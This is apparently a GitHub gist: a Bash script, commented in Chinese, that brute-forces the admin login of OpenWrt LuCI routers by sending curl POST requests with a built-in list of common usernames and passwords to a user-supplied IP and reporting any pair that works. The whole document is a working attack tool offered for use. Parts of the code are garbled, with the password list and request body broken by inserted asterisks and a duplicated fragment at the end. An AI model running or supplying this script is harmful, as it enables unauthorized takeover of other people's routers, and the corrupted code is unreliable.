#date: 2025-12-31T16:56:19Z
#url: https://api.github.com/gists/d8d7bfa7a0eb480ab6dff4f15daec78c
#owner: https://api.github.com/users/teamochen

cat > /tmp/crack_luci_multi.sh << 'SCRIPT_EOF'
#!/bin/bash
# 获取用户输入的IP地址
read -p "请输入目标IP地址: " TARGET

# 检查是否输入了IP地址
if [ -z "$TARGET" ]; then
    echo "错误: 必须输入目标IP地址!"
    exit 1
fi

# 验证IP地址格式（简单验证）
if ! [[ $TARGET =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "警告: '$TARGET' 看起来不是有效的IP地址格式，但仍会继续..."
fi

# 用户名列表
usernames=(root admin test user ubnt oracle guest support nbpt ubuntu postgres nagios pi ftpuser git ftp adm 1234 temp default usuario mysql 111111 manager user1 operator administrator butter hadoop super)
# 密码列表
passwords= "**********"
123456 123456789 picture1 password 12345678 111111 123123 12345
1234567890 senha 1234567 qwerty abc123 Million2 000000 1234 iloveyou
aaron431 password1 qqww1122 123 omgpop 123321 654321 qwertyuiop
qwer123456 123456a a123456 666666 asdfghjkl ashley 987654321 unknown
zxcvbnm 112233 chatbooks 20100728 123123123 princess jacket025 evite
123abc 123qwe sunshine 121212 dragon 1q2w3e4r 5201314 159753
123456789 pokemon qwerty123 Bangbang123 jobandtalent monkey
1qaz2wsx abcd1234 default aaaaaa soccer 123654 ohmnamah23
12345678910 zing shadow 102030 11111111 asdfgh 147258369 qazwsx
qwe123 michael football 1q2w3e4r5t party daniel asdasd
222222 myspace1 asd123 555555 a123456789 888888 7777777 fuckyou
1234qwer superman 147258 999999 159357 love123 tigger purple
samantha charlie babygirl 88888888 jordan23 789456123 jordan
anhyeuem killer basketball michelle 1q2w3e lol123 qwerty1
789456 6655321 nicole naruto master chocolate maggie computer
hannah jessica 123456789a password123 hunter 686584 iloveyou1
987654321 justin cookie hello blink182 andrew 25251325 love
987654 bailey princess1 123456 101010 12341234 a801016 1111
1111111 anthony yugioh fuckyou1 amanda asdf1234 trustno1
butterfly x4ivygA51F iloveu batman starwars summer michael1
00000000 lovely jakcgt333 buster jennifer babygirl1 family
456789 azerty andrea q1w2e3r4 qwer1234 hello123 10203 matthew
pepper 12345a letmein joshua 131313 123456b madison Sample123
777777 football1 jesus1 taylor b123456 whatever welcome ginger
flower 333333 1111111111 robert samsung a12345 loveme gabriel
alexander cheese passw0rd 142536 peanut 11223344 thomas angel1)
echo "================================================="
echo "      OpenWrt LuCI 后台登录爆破器"
echo "      目标: $TARGET"
echo "================================================="
try_login() {
    user=$1
    pass=$2
    
    response=$(curl -s -i --connect-timeout 3 \
        -d "luci_username= "**********"=$pass" \
        "http://$TARGET/cgi-bin/luci" 2>/dev/null)
    
    if echo "$response" | grep -q "HTTP/1.1 302" || echo "$response" | grep -q "sysauth="; then
        echo -e "\n\n🎉 破解成功！"
        echo -e "用户名: \033[32m$user\033[0m"
        echo -e "密  码: \033[32m$pass\033[0m"
        echo "地址: http://$TARGET"
        return 0
    fi
    return 1
}
total_users=${#usernames[@]}
total_passes= "**********"
total_attempts=$((total_users * total_passes))
current=0
found=0
start=$(date +%s)
echo "用户数: $total_users"
echo "密码数: $total_passes"
echo "总尝试次数: $total_attempts"
echo "================================================="
echo "正在开始测试..."
echo "按 Ctrl+C 可以中断测试"
for user in "${usernames[@]}"; do
    for pass in "${passwords[@]}"; do
        current=$((current + 1))
        
        printf "\r进度: %d/%d | 用户: %-10s | 密码: %-15s" \
            "$current" "$total_attempts" "$user" "$pass"
        
        if try_login "$user" "$pass"; then
            found=1
            break 2
        fi
        
        sleep 0.2
    done
done
end=$(date +%s)
time_taken=$((end - start))
echo -e "\n================================================="
[ $found -eq 0 ] && echo "未找到正确的用户名/密码组合。"
echo "总耗时: ${time_taken}秒"
[ $time_taken -gt 0 ] && echo "平均速率: $((current / time_taken)) 次/秒"
echo "================================================="
SCRIPT_EOF

chmod +x /tmp/crack_luci_multi.sh
/tmp/crack_luci_multi.sh 0 ] && echo "平均速率: $((current / time_taken)) 次/秒"
echo "================================================="
SCRIPT_EOF

chmod +x /tmp/crack_luci_multi.sh
/tmp/crack_luci_multi.sh